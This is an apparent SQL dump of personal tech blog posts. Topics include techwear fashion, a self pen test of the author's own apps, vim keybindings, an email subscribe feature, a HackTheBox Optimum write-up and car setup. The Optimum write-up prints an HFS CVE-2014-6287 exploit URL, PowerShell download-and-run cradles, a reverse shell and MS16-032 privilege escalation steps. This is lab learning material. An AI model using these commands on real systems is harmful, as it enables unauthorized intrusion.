Kidneys</p>\r\n\r\n<h4>Causal</h4>\r\n<p>Produced for day to day use, causal Techwear blends with the normalcy of our current fashion standards while incorporating features that helps the ease of commute and work in a professional environment. Styled very basic, and often business casual, casual Techwear is great for the grey man that keeps to him/herself, below the radar with great looking and highly functional clothing. Uniqlo and Outlier are the main brands you should look out for. ROSEN is also a pretty new brand that I quite like, although whether you can consider some of their collection as Techwear is debatable.</p>\r\n<p><b>General Price: </b>1 Kidney</p>\r\n\r\n<h4>Tech-Focused</h4>\r\n<p>For the enthusiasts, and those with deep pockets who might want to chase after brands that focus on technicality over design. Tech-Focused brands as the name implies, center on fitting as many functions and features into their pieces in a very minimalist style, such as Stone Island, Arc’teryx Veilance, and Descente Allterrain. Constantly gaining the one up in the by community introducing garments with the latest and greatest in what technology offers.</p>\r\n<p><b>General Price: </b>4 Kidneys</p>\r\n\r\n<h4>Fashion-Over</h4>\r\n<p>Opposing tech-focused brands, these brands are form first and functionality second. Brands such as North Face Purple Label, Y-3, and White Mountaineering choose to incorporate experimental technologies and construction in new and exciting ways and because of this, their function is never fully guaranteed, at least not on the level of other brands.<p>\r\n<p><b>General Price: </b>3 Kidneys</p>\r\n\r\n<h4>Utilitarian</h4>\r\n<p>Utilitarian or some brands in this category might fall into the communities favorite term \"Techninja\" which is centered around the futuristic dystopian military outlook. Utilitarian as a whole center themselves around this push for an ever-greater liberation in movements, incorporating various storage options, increasing ease of use, the addition of extra bells and whistles like Acronym’s gravity pocket, and often using the latest materials to come out of the woodworks. In case you haven\'t figured it out yet: this is the best one.</p>\r\n<p><b>General Price: </b>5 Kidneys</p>','techwear-thumb.png','techwear','no'),
	(14,'basic_wapt','A Basic Pen Test Of Every Web Application I\'ve Made','2018-09-06','infosec','<p>This is going to be a very short penetration test mainly focusing on low hanging fruit, mostly because I don\'t care very much for what I\'ve made - they were all created to serve a specific goal of allowing me to learn something new instead of actually being useful. In fact, this blog is the only thing I still maintain and all the others will probably be turned off at some point and to be honest, I seriously doubt I will find any exploits. While security wasn\'t a main focus when creating these applications, I believe (or at least I hope) I wasn\'t stupid enough to leave myself vulnerable to any of the basic exploits I will attempt here today. Although there is only one way to find out, so let\'s get on with it.</p>\r\n\r\n<h4>Table of Contents</h4>\r\n<ul>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">SPDS</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">Viperidae</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">Blog</a></li>\r\n</ul>\r\n\r\n<h2 id=\"x100\">0x100: SPDS</h2><hr>\r\n<p><a href=\"/article/spds_release\">Spotfiy Playlist Depression Score (SPDS)</a> is an application that rates how depressing your Spotify playlist is. This was my first foray into the JavaScript framework world with AngularJS, so let\'s start off with some basic XSS.</p>\r\n\r\n<p>The only field we can enter any inputs is this one here, where you can manually enter a playlist.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-spds-xss-find.png\" alt=\"image-alternative\">\r\n\r\n<p>So now let\'s inject some HTML code, I will try a <code>&#x3C;h1&#x3E;This shouldn&#x27;t work&#x3C;/h1&#x3E;</code>. It now displays this: </p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-spds-xss-attempt.png\" alt=\"image-alternative\">\r\n\r\n<p>Obviously, it didn\'t work because the playlist ID is never actually shown anywhere after you enter it (apart from the URL) and it is only used for the Spotify API. Entering a wrong ID will just to just not show anything, although it is only just now occurring to me that I should have implemented some sort of error message when you enter an ID that doesn\'t exist.</p>\r\n\r\n<p>Next we could attempt a SQL inject. I know that the playlist ID given in the URL attempts a SQL query for a playlist in the database which acts as a cache for the Spotify and Genius APIs in order to prevent them from being called very often and speed up the process on subsequent ranking attempts.</p>\r\n\r\n<p>Fortunately (or unfortunately, depending on whose side you\'re on), we won\'t even need to attempt it as <a href=\"https://github.com/apt-helion/spds/blob/master/app.py#L121-L125\">this code here</a> shows that we still call the Spotify API to verify that it is an existing playlist ID before we even start our SQL query.</p>\r\n<pre>\r\nplaylist_id = request.args.get(\'playlist\')\r\npage        = request.args.get(\'page\')\r\n\r\nplaylist    = spotify.get_playlist(user.get(\'id\', \'me\'), playlist_id, auth_header)\r\nif not valid_token(playlist): return redirect(\'/search\', code=302)\r\n</pre>  \r\n\r\n<p>Okay then. What else can we do... session hijacking? We can log into Spotify which gives us an auth header, allowing SPDS to see user data (our playlists), the app then stores the auth header in the session to post to Spotify in future requests.</p>\r\n\r\n<p>The web framework we\'re using (Flask), stores a session identifier in a cookie like so:</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-spds-session.png\" alt=\"image-alternative\">\r\n\r\n<p>So if we manage to steal a victim\'s session, we will be logged into the victim\'s Spotify for our app! And this is where our pen test for SPDS ends. As far as I know, there is no way to get a session without having direct access to a victim\'s computer or the server hosting the app (or having it shown in a screenshot from a blog ;). Common ways like XSS won\'t work (as seen above) and packet sniffing won\'t work as everything goes through HTTPS while attempting to use HTTP instead will just redirect to this blog (for some reason. I should probably go fix that).</p>\r\n\r\n<h2 id=\"x200\">0x200: Viperidae</h2><hr>\r\n<p>Okay so far the score is [Me (pen tester): 0 - Me (software developer): 1] and with Viperidae, my incomplete attempt at a search engine, it looks like \'Me (software developer)\' is going for a commanding 0-2 victory.</p>\r\n\r\n<p>Viperidae was supposed to have two parts to it\'s API, the main part being one used by developers. The developer part would allow devs to crawl and index their own sites and implement a search for them, allowing developers to easily implement a search for their own site by just hooking into the Viperidae API. Anyway the point is that most of this is not complete, and only a public facing site is active right now, which is very limited.</p>\r\n\r\n<p>This is going to be a very quick test since the app is so small. In fact I can sum it up in bullet points.</p>\r\n<ul>\r\n	<li><b>XSS:</b> No. The JS framework I was learning this time (React) sanitises everything.</li> \r\n	<li><b>SQLi:</b> No. It doesn\'t use SQL (the public version doesn\'t, the developer version would).</li> \r\n	<li><b>Session Hijacking:</b> No. It doesn\'t use sessions.</li>\r\n</ul>\r\n\r\n<p>However, there is one part I been concerned about for a while and just haven\'t been bothered to check if it was actually a concern. If you look at the code for the crawler you will see <a href=\"https://github.com/apt-helion/viperidae/blob/canary/api/crawl.py#L202-L204\">these three lines</a>.</p>\r\n\r\n<pre>\r\ndel(Spider.cache) # I\'m pretty sure Spider.cache causes a memory leak\r\ngc.collect() # so this just makes sure it is cleared, we don\'t need it anymore\r\nSpider.cache = {} # I actually have no idea, should probably test it\r\n</pre>\r\n\r\n<p>As you can see from the comments, I am concerned about the cache causing a memory leak, as the crawler saves every page it requests into this cache. Since <code>Spider.cache</code> is a class attribute, it is shared between all instances of classes. I was unsure if this was ever cleared so I manually did it myself. Now I am finally going to test this.</p>\r\n\r\n<p>We will do two tests - one with the <i>\'fix\'</i> and one without. I will be using the script below which requests several sites for the API to index and then monitor the memory usage.</p>\r\n\r\n<pre>\r\nimport requests\r\n\r\nURL = \'https://viperidae.app/index\'\r\n\r\nSITES = [\r\n    \'https://blog.justinduch.com\',\r\n    \'http://www.zachtronics.com\',\r\n    \'https://www.redpandanetwork.org\',\r\n    \'https://infosecjon.com\',\r\n    \'https://www.malwarebytes.com\',\r\n    \'https://www.docker.com\',\r\n    \'https://www.bleepingcomputer.com\',\r\n    \'https://www.renaultsport.com\',\r\n    \'https://frog.com\',\r\n    \'https://www.bookdepository.com\'\r\n    \'https://plenz.com\'\r\n]\r\n\r\n\r\ndef test_memory():\r\n    for site in SITES:\r\n    	print(f\'Requesting {site}\')\r\n    	payload = {\'u\': site}\r\n    	requests.get(URL, params=payload)\r\n\r\n\r\nif __name__ == \'__main__\':\r\n    test_memory()\r\n</pre>\r\n\r\n<p>Here is the memory usage before we start.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-viperidae-memory.png\" alt=\"image-alternative\">\r\n\r\n<p>Now we will run the script with the <i>\'fix\'</i> implemented.</p>\r\n\r\n<p>There was no difference, the graph is exactly the same. I even looked at the memory usage from the server itself with <code>free -m</code> before and after, and also found no difference. So maybe the fix really is a fix? Okay so now let\'s remove it and run the test again.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-viperidae-memory-after.png\" alt=\"image-alternative\">\r\n<p>Again no difference except from a small decrease, which is probably just from me restarting the app. Now it is possible that I just didn\'t request as many sites as I may have should, but I would still have expected even the slightest increase in memory usage. So it turns out my fears of a memory leak were wrong and the fix was unneeded.</p>\r\n\r\n<h2 id=\"x300\">0x300: Blog</h2><hr>\r\n<p>Considering this is the only web app I still maintain, I\'m going to put a little more effort in trying to find vulnerabilities. However, we still have to start with the basics.</p>\r\n<ul>\r\n	<li><b>XSS:</b> No. There is nowhere to do it (the search bar doesn\'t work).</li>\r\n	<li><b>SQLi</b> No. The article IDs in the URL are actually used in a SQL query, but those are sanitised by peewee.</li>\r\n	<li><b>Session Hijacking:</b> No. There are no sessions being used.</b>\r\n</ul>\r\n\r\n<p>With those out of the way, let\'s look at \'path file traversal\'. If you look at the URLs for any of the images shown here, you will see that they are all from <code>/common/static/img/</code> which is the real path from the file structure of the app. The web framework I use is very determent on directory structure to act as individual pages. <a href=\"https://github.com/apt-helion/blog/blob/master/website/common/index.py#L3-L5\">Looking at the code</a>, we can see that the framework just serves the file by the filename straight from the specified directory without doing anything to it.</p>\r\n<pre>\r\n@web(\'/common/static/<path:file>\', file=True)\r\ndef files(request, file):\r\n	return \'./common/static/\' + file\r\n</pre>\r\n\r\n<p>Let\'s attempt a <code>dot-dot-slash attack</code> by prefacing the sequence with <code>../</code>. With this, it may be possible to access directories that are hierarchically higher than the one from which we are picking the file. Let\'s attempt to show <code>/etc/passwd</code>.</p>\r\n\r\n<p>Looking back at the code and it\'s directory structure, we can see that <code>/common/static/</code> is 4 directories down from the blog\'s root directory. Now we can assume (although I know it is) that the blog is hosted in <code>/var/www/</code> which is another 2 directories from root. In order to get to <code>/etc/passwd</code>, we will need to preface it with 6 <code>../</code>s. So it will look something like this:</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-blog-file-test.png\" alt=\"image-alternative\">\r\n\r\n<p>If you try it yourself, you will just see that it resolves to <code>blog.justinduch.com/etc/passwd</code> and returns a 404. I also did another test where I attempted to get a file just outside in the <code>common/</code> directory, but that didn\'t work too.</p>\r\n\r\n<p>Finally, let\'s attempt to get into to <code>/admin</code> page, which is where all the articles are edited. Currently what I do to add/edit articles is: turn on a dev instance of the app, go to <code>/admin</code>, add/edit the article, dump the SQL db to a file, and then source the file in the production server. What allows the app to determine whether it is either in a dev or production instance is a single environment variable. If we were somehow able to change the environment variable in our production server everyone would be granted access to <code>/admin</code>! Obviously this is not the best way of editing posts, but I do intend to change this... eventually.</p>\r\n\r\n<p>The only problem is that I have no knowledge of environment variable exploits from a web app, but since this is the grand finale, let\'s do something I\'ve not done so far but probably should have many times. I\'m going to <s>Google</s> DuckDuckGo it.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/wapt-blog-duck.png\" alt=\"image-alternative\">\r\n<p>I didn\'t find anything. Not saying an exploit like that doesn\'t exist, just that I couldn\'t find anything like it. Either way, I really need to update this blog.</p>','wapt-thumb.png','pentest,python,spds,viperidae,blogpost','no'),
	(15,'vimrc','Looking At My .Vimrc','2018-09-12','miscellaneous','<p>This is a reference guide for my .vimrc that you can find <a href=\"https://github.com/apt-helion/dotfiles/blob/master/vimrc\">here</a>. This is mainly being written because I keep forgetting what keybindings some of the plugins use. Even though this is not a guide to the .vimrc, if you use Vim you may still find this somewhat useful. If you don\'t use Vim, you are a bad person and should go away >:(</p>\r\n\r\n<h3>Leader</h3>\r\n<p>The leader key has been remapped to the comma key <code>,</code>.</p>\r\n\r\n<h3>Tabs/Buffers</h3>\r\n<p>Move between tabs with <code>--</code> to go back and <code>==</code> to go forward.</p>\r\n<p>Move between buffers with <code>TAB-k</code> to go back and <code>TAB-j</code> to forward.</p>\r\n<p>Close buffers with <code>LEADER-bq</code>.</p>\r\n\r\n<h3>Windows</h3>\r\n<p>Move between window panes with <code>CTRL-[h,j,k,l]</code>.</p>\r\n<p>Create a terminal window (only on Vim8) with <code>LEADER-ht</code> for horizontal and <code>LEADER-vt</code> for vertical.</p>\r\n<p>Close a terminal window with <code>ESC</code>.</p>\r\n\r\n<h3>Commands/Other</h3>\r\n<p>Show the weather (for Sydney) with <code>LEADER-we</CODE>.</p>\r\n<p>Reference the current file\'s path in command line with <code>%%</code>.</p>\r\n<p>Run the current file with Python with <code>:Pyrun</code>. Do it with interactive mode <code>:PyrunI</code>.</p>\r\n<p>Write as root with sudo tee hack with <code>:Write</code>.</p>\r\n<p>Rename current file with <code>LEADER-rn</code>.</p>\r\n\r\n<h3>Plugins</h3>\r\n<h4><a href=\"https://github.com/mbbill/undotree\">Undotree</a></h4>\r\n<p>Open undotree with <code>LEADER-u</code>.</p>\r\n\r\n<h4><a href=\"https://github.com/majutsushi/tagbar\">TagBar</a> / CTags</h4>\r\n<p>Open TagBar with <code>LEADER-t</code>.</p>\r\n\r\n<h4><a href=\"https://github.com/easymotion/vim-easymotion\">Easymotion</a></h4>\r\n<p>Trigger word motion with <code>LEADER LEADER w</code>.</p>\r\n<p>Search ctags with <code>LEADER-.</code>.</p>\r\n\r\n<h4><a href=\"https://github.com/terryma/vim-multiple-cursors\">Multiple Cursors</a></h4>\r\n<p>Taken from the docs (mostly), I haven\'t played around with this very much:</p>\r\n<ul>\r\n<li>start: <code>CTRL-n</code> start multicursor and add a virtual cursor + selection on the match</li>\r\n<ul>\r\n        <li>next: <code>CTRL-n</code> add a new virtual cursor + selection on the next match</li>\r\n        <li>skip: <code>CTRL-x</code> skip the next match</li>\r\n        <li><strike>prev: <code>CTRL-p</code> remove current virtual cursor + selection and go back on previous match</strike>. Don\'t do this, <code>CTRL-p</code> opens control p instead.</li>\r\n</ul>\r\n<li>select all: <code>ALT-n</code> star muticursor and directly select all matches</li>\r\n</ul>\r\n\r\n<p>You can now change the virtual cursors + selection with visual mode commands.\r\nFor instance: <code>c, s, I, A</code> work without any issues.\r\nYou could also go to normal mode by pressing v and use normal commands there.</p>\r\n\r\n<p>At any time, you can press <code>ESC</code> to exit back to regular Vim.</p>\r\n\r\n<h4><a href=\"https://github.com/tpope/vim-commentary\">Commentary</a></h4>\r\n<p>Comment out one line with <code>gcc</code>.</p>\r\n<p>Comment out multiple lines (in visual. mode) with <code>gc</code>.</p>\r\n\r\n<h4><a href=\"https://github.com/tpope/vim-surround\">Surround</a></h4>\r\n<p>Change the surrounding elements of a word with <code>cs/old/new/</code>. e.g <code>cs\'\"</code>.</p>\r\n<p>Wrap a word with elements with <code>ysiw/elem/</code>. e.g <code>ysiw{</code>.</p>\r\n\r\n<h4><a href=\"https://github.com/easymotion/vim-easymotion\">Easymotion</a></h4>\r\n<p>Trigger word motion with <code>LEADER LEADER w</code>.</p>\r\n','vimrc-thumb.png','vim,vimrc','no'),
	(16,'remember_to_subscribe','And Remember To SMASH That Subscribe Button','2018-09-15','development','<p>A few days ago someone asked if I had a subscribe feature for this blog where I would email people every time I posted something, so I told them:</p>\r\n\r\n<p><i>\'No, that\'s a shit idea, why would I want to make it easier for people to read my poorly written rants?\'</i></p>\r\n\r\n<p>However, it\'s currently 01:00 in the morning and I\'ve been attempting privilege escalation on the HTB box SecNotes for over 7 hours now trying to get this STUPID FUCKING <strong>&lt;redacted for spoilers&gt;</strong> TO WORK AND I DON\'T EVEN KNOW IF IT\'S WHAT I\'M SUPPOSED TO DO. I MEAN I MANAGED TO GET A <strong>&lt;redacted for spoilers&gt;</strong> WORKING EXCEPT IT DOESN\'T ACTUALLY WORK FOR SOME REASON I DON\'T KNOW WHAT THE FUCK EVEN IS THIS.</p>\r\n\r\n<p>So I think it\'s time to do something different.</p>\r\n\r\n<p>If you go to the <a href=\"/\" target=\"_blank\">home page</a> now and scroll to the bottom, you will see a field where you can enter your email to subscribe and be notified every time I post and article! Just make sure to verify your email after you enter it.</p>\r\n\r\n<p>Ok that\'s all. Thanks everyone, goodbye.</p>\r\n\r\n<p>...</p>\r\n\r\n<p>Oh of course that\'s not actually the end silly! This is a tech blog after all, and I am legally required to explain how it works even though it\'s incredibly simple and no one cares. So let\'s get right into it.</p>\r\n\r\n<p>In order to actually send the emails I\'m using an edited version of <a href=\"https://github.com/ludmal/pylib/blob/master/mail.py\" target=\"_blank\">this script</a> which made the process pretty simple, making the majority of my work focused on the verification and unsubscribing portions. Both of these as you would imagine are just uuids I assign to each email and send through with each link.</p>\r\n\r\n<p>Now with the emails themselves, you may have noticed that they are being sent from \'noreply@noreply.justinduch.com\' instead of my actual <i>business</i> email which is \'justin@justinduch.com\'. This is because Protonmail, the email server I am using, does not support IMAP/SMTP currently. I\'ve had to create new domain records for \'noreply.justinduch.com\' in order to point MX records to the Google SMTP servers, which is obviously not ideal but there\'s not much I can do.</p>\r\n\r\n<p>The actual email content is in HTML, although I was too lazy to actually write it myself I just used <a href=\"https://beefree.io/\" target=\"_blank\">BEE Free</a> to make them for me (not advertising or anything, they were literally the first search result for \'html email editor\'). I think the email itself looks fine, but if you look at the source code for these emails, the combination of not having the ability to put CSS in separate files and generated code from some website makes it\'s a pretty ugly site to see.</p>\r\n\r\n<p>I think that just about wraps it up. Like I said, pretty simple and uninteresting. So that\'s it for real now. Goodbye.</p>\r\n\r\n<p>...</p>\r\n\r\n<p>SIKE! Did you forget that this actually a security-focused tech blog? The one thing that was constantly going through my mind as I wrote this service up (for reasons completely unrelated to previous events) was: <i>\'can this be hacked?\'</i></p>\r\n\r\n<p>The answer to that, as always is:</p>\r\n\r\n<p><i>\'Uh, yeah... pr-probably.\'</i></p>\r\n\r\n<p>While writing it I attempted to identify the most likely things that could be vulnerable. Which were obviously SQLi and XSS, but because I\'m kinda tired right now, I\'m just gonna get SQLi out of the way: No, you can\'t, peewee santises everything.</p>\r\n\r\n<p>So let\'s try to XSS the initial subscription page, which shows you your email after you enter it on the next page. We will just put in a basic <code>&lt;plaintext&gt;</code> tag.</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/subscribe-plaintext.png\" alt=\"image-alternative\">\r\n<p>Oh no! It only accepts correct email addresses and stops us from submitting our code! Looks like this is unhackable...</p>\r\n\r\n<p>Is what an idiot would say. This shitty client side validation is no match against my best friend Burp Suite. We\'ll just give the input a correct value and my buddy will intercept the request and change it to the value we actual want.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/subscribe-burb.png\" alt=\"image-alternative\">\r\n<p>Wow. I wish I could intercept like Burp.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/subscribe-fail.png\" alt=\"image-alternative\">\r\n<p>Oh. It didn\'t work and looking at the logs, it looks like it failed correctly.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/subscribe-error.png\" alt=\"image-alternative\">\r\n<p>Looks like this is it then. The real end. It\'s been a good ride, have a great night everyone.</p>\r\n\r\n<p>...</p>\r\n\r\n<p>But I hear you ask: <i>\'Isn\'t this also a fashion blog?\'</i></p>\r\n<p>No. That was a one time thing. I\'m serious now this is the end. <strong>GOODBYE, GO AWAY, SUBSCRIBE. OH NO WAIT. SUBSCRIBE AND THEN GO AWAY!</strong></p>','subscribe-thumb.png','blogpost,python','no'),
	(17,'htb_optimum','HackTheBox: Optimum (ft. PowerShell)','2018-09-19','infosec','<p class=\"text-center\"><i>\"Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.\"</i></p>\r\n<p class=\"text-center\">-- Optimum Synopsis</p>\r\n<hr>\r\n<p>Optimum was a fun box with which while the write-up says to use Metasploit, can be done almost entirely with PowerShell. This makes it good practice for someone like me who has never used PowerShell to learn some basic things.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/optimum-nmap.png\" alt=\"image-alternative\">\r\n<p>Our initial nmap scans only show one port open running HttpFileServer (HFS) version 2.3, which is vulnerable to <a href=\"https://www.cvedetails.com/cve/CVE-2014-6287/\">CVE-2014-6287</a>. From the description it <i>\"allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.\"</i> Basically this just allows us to execute HFS template macros by just sending a null byte (%00) to the search item. Metasploit has the module <b>exploit/windows/http/rejetto_hfs_exec</b> to exploit this vulnerability and get a meterpreter shell, but to get a reverse shell in PowerShell, we are going to do it manually.</p>\r\n\r\n<p>Using <a href=\"http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands\">this reference guide</a>, we can see that the command we want is \"{.exec | A.}\", where \'A\' is the file to run. In order to get a reverse shell, our script will want to look something like: \"{exec | powershell.exe ReverseShell.ps1}\", which will run the \"ReverseShell.ps1\" script in PowerShell. The reverse shell script we will be using comes from <a href=\"https://github.com/samratashok/nishang\">Nishang</a>, which is a collection of PowerShell scripts used for pen testing. Specifically we want to use <a href=\"https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1\">Invoke-PowerShellTcp.ps1</a>. Download it and add this line to the bottom of the file to make the \'Invoke-PowerShellTcp\' function run when the script is executed without any arguments:</p>\r\n\r\n<pre>\r\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4444\r\n</pre>\r\n\r\n<p>Our IP address is 10.10.14.3 and we want to listen on port 4444. In order to get this script into the target machine, we will setup our own HTTP server from where the file can be downloaded from. This can be done using a basic Python module form the command line:</p>\r\n<pre>\r\n# Make sure you are in the same directory as the reverse shell script\r\npython -m SimpleHTTPServer # for Python 2\r\npython -m http.server # for Python 3\r\n</pre>\r\n<p>This will setup a HTTP server which we can access from our IP address (10.10.14.3) on port 8000 (by default). Okay, so now we need a way to cause our target machine to download and run this script. On a Linux box with Bash this would be a simple:</p>\r\n<pre>\r\ncurl http://10.10.14.3:8000/ReverseShell.sh | bash\r\n</pre>\r\n<p>But on PowerShell it looks a bit different:</p>\r\n<pre>\r\nIEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1\')\r\n</pre>\r\n<p>Because this isn\'t intended to be a tutorial on PowerShell (I intend to do that later), for now I\'ll just say that this command is almost identical in what it does to the curl command above. That is - it downloads the reverse shell script and then runs it.</p>\r\n<p>Now is finally time to do the exploit. We will open up netcat as our listener on port 4444 with \"nc -lvnp 4444\" and paste this into the search URL:</p>\r\n<pre>\r\n/?search=%00{.exec|C%3a\\Windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe+IEX(New-Object+System.Net.WebClient).DownloadString(\'http%3a//10.10.14.4%3a8000/Invoke-PowerShellTcp.ps1\').}\r\n</pre>\r\n<p>Without URL encoding it should look like this:</p>\r\n<pre>\r\n/?search=%00{.exec|C:\\Windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX(New-Object+System.Net.WebClient).DownloadString(\'http://10.10.14.4:8000/Invoke-PowerShellTcp.ps1\').}\r\n</pre>\r\n<p>You can see at the start we use the null terminator (%00) then execute our command from \'powershell.exe\' located in \'C:\\Windows\\SysNative\\WindowsPowershell\\v1.0\\\' which is the 64bit version of PowerShell.</p>\r\n\r\n<img class=\"img-responsive\" src=\"/common/static/img/optimum-ncat.png\" alt=\"image-alternative\">\r\n<p>We can now get user.txt from the current directory.</p>\r\n\r\n<p>Normally to get root with Metasploit you could use <b>local_exploit_suggester</b>. But we will use <a href=\"https://github.com/rasta-mouse/Sherlock\">Sherlock</a>, which is a script to find missing software patches for privesc. Download it and add this line to the bottom of the script:</p>\r\n<pre>\r\nFind-AllVulns\r\n</pre>\r\n<p>Now we will invoke it from our shell with:</p>\r\n<pre>\r\nIEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.3:8000/Sherlock.ps1\')\r\n</pre>\r\n<p>This will go through every vulnerability, but the one we are interested in is this (MS16-032):</p>\r\n<img class=\"img-responsive\" src=\"/common/static/img/optimum-sherlock.png\" alt=\"image-alternative\">\r\n<p>MS16-032 is a vulnerability could allow elevation of privilege if the Windows Secondary Logon Service fails to properly manage request handles in memory.</p>\r\n<p>In order to exploit this vulnerability we will use <a href=\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1\">this script</a> form the Empire exploitation framework for PowerShell. As usual add this line at the bottom to run the function when it is downloaded.</p>\r\n<pre>\r\nInvoke-MS16032 -Command \"IEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.4:8000/Invoke-PowerShellTcp-MS16032.ps1\')\"                           \r\n</pre>\r\n<p>As you can see we are creating another reverse shell, but because of the MS16-032 exploit, we will run it as root. Also note that you can\'t use the same port that your current shell is using, so you will have to create another script and netcat instance with a different port. I will be using port 4448.</p>\r\n\r\n<p>Now we run the command from our shell to get the script: </p>\r\n<pre>\r\nIEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.3:8000/Invoke-MS16032.ps1\')\r\n</pre>\r\n<img class=\"img-responsive\" src=\"/common/static/img/optimum-root.png\" alt=\"image-alternative\">\r\n<p>And now we are root. The flag is in \'C:\\Users\\Administrator\\Desktop\\root.txt\'.</p>\r\n\r\n<p>This was a good exercise for me to get familiar with some of the tools used with PowerShell as I\'ll probably need it in the future.</p>','optimum-thumb.png','htb,powershell','no'),
	(18,'car_setup','Race Car Setup Reference Manual (For Video Games)','2018-09-27','engineering','<p>Forza Horizon 4 is being released tomorrow (for Ultimate Edition owners), so while I endure this endless wait, let\'s look at how to setup your car, except we are actually going to look at the Assetto Corsa Competizione setup page because I can\'t actually see the FH4 page (it\'s probably better anyway). This is also the first post I\'ve put in the engineering tab after the 5 months that this blog has been active. Neat.</p>\r\n\r\n<h4>Table of Contents</h4>\r\n<ul>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x100\">Tyres</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x200\">Electronics</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x300\">Mechanical Grip</a></li>\r\n    <li><a href=\"#\" class=\"scroll-to\" data-scroll-to=\"x400\">Aero</a></li>\r\n</ul>\r\n\r\n<h3 id=\"x100\">0x100: Tyres</h3><hr/>\r\n<h4>PSI</h4>\r\n<p>Softer tyres have a larger surface area which improves traction at a cost to responsiveness in high load situations. Increasing tyre pressure can very slightly improve straight line speed, but also creates higher tyre temperatures.</p>\r\n<h4>Toe</h4>\r\n<p>The toe angle identifies the exact direction the tires are pointed compared to the centerline of the vehicle when viewed from directly above. Toe is expressed in either degrees or fractions-of-an-inch, and an axle is said to have positive toe-in when imaginary lines running through the centerlines of the tires intersect in front of the vehicle and have negative toe-out when they diverge.</p>\r\n<p>A primary purpose of adjusting toe is to alter how the vehicle responds to the initial steering input. Setting the front wheels with toe out will provide the vehicle with a sharper turning response at the expense of front stability.</p>\r\n<p>Rear toe-in causes the more heavily loaded outside tire to start with a slight slip angle so the buildup in forces are going to start sooner and the maximum yaw for a given amount of steering will be less. For both of these reasons the car will feel more stable during cornering.</p>\r\n<h4>Camber</h4>\r\n<p>The camber angle identifies how far the tire slants away from vertical when viewed directly from the front or back of the vehicle. Camber is expressed in degrees, and is said to be negative when the top of the tire tilts inward toward the center of the vehicle and positive when the top leans away from the center of the vehicle.</p>\r\n<p>Adjusting the camber angle will change the tyre contact patch with the track surface, where adding negative camber can improve lateral grip in sustained cornering situations, at a cost to longitudinal traction.<p>\r\n\r\n<h3 id=\"x200\">0x200: Electronics</h3><hr/>\r\n<h4>TC</h4>\r\n<p>Traction control (TC) limits wheel spin under power. Higher levels give more intervention resulting in a more stable car but potentially slower lap times.</p>\r\n<h4>ABS</h4>\r\n<p>An anti-lock braking system (ABS) keeps the wheels from locking under heavy braking. Higher levels equals more intervention, better positioning under braking, but longer braking distances.</p>\r\n\r\n<h3 id=\"x300\">0x300: Mechanical Grip</h3><hr/>\r\n<h4>Anti-Roll Bars</h4>\r\n<p>Anti-roll bars don\'t directly add or take away grip; they simply shift how the load is distributed among the tires during cornering. This causes a balance shift because of a tire\'s load sensitivity. Stiff anti-roll bars will reduce the amount of body roll while turning into corners, but will put the tyres under excessive loads during prolonged corners. Soft anti-roll bars provide good traction throughout prolonged corners at a cost to initial responsiveness.</p>\r\n<h4>Brake Power/Bias</h4>\r\n<p>Brake pressure determines the maximum potential breaking power of the vehicle. Although an increase in brake pressure can result in shorter stopping distances, depending on the amount of ABS, it will be far easier to lock up.</p>\r\n<p>Brake bias indicates the relative amount of brake pressure applied to the front brakes. E.g. 52% would indicate that the front brakes were receiving 52% of the brake pressure and the rear brakes would be receiving 48%. Brake bias adjustable from the cockpit in GT3 cars and is used to maximize braking potential and control vehicle balance while using the brakes. Setting brake bias to the front increases the chances of front lock ups, causing understeer on corner entry, whereas rearward bias has the opposite effect.</p>\r\n<h4>Steering Ratio</h4>\r\n<p>The steering ratio is the ratio of the number of degrees of turn of the steering wheel to the number of degrees the wheel turn as a result. A higher steering ratio means that the steering wheel is turned more to get the wheels turning, but it will be easier to turn the steering wheel. A lower steering ratio means that the steering wheel is turned less to get the wheels turning, but it will be harder to turn the steering wheel.</p>\r\n<h4>Wheel Rate</h4>\r\n<p>Wheel rate is the spring rate (amount of weight it takes to compress a spring a certain distance) but measured at the wheel instead of where the spring attaches to the chassis. Higher wheel rates will stop the car from lunging forward during aggressive breaking or rearward under sudden acceleration. While this improves aerodynamic stability, it can be very harsh on tyres as well as skittish over bumps. Lower rates absorb bumps more effectively, but harsh acceleration or breaking can pivot the vehicle aggressively, lowering stability.</p>\r\n<h4>Dampers</h4>\r\n<p>A part of a car\'s suspension designed to reduce oscillations and modify the dynamic movement of the car. Also known as a shock absorber. Race-oriented dampers may have separate adjustment for compression (bump) and extension (rebound). Dampers can be configured in slow speeds (slow body movements; in roll, pitch and squat), as well 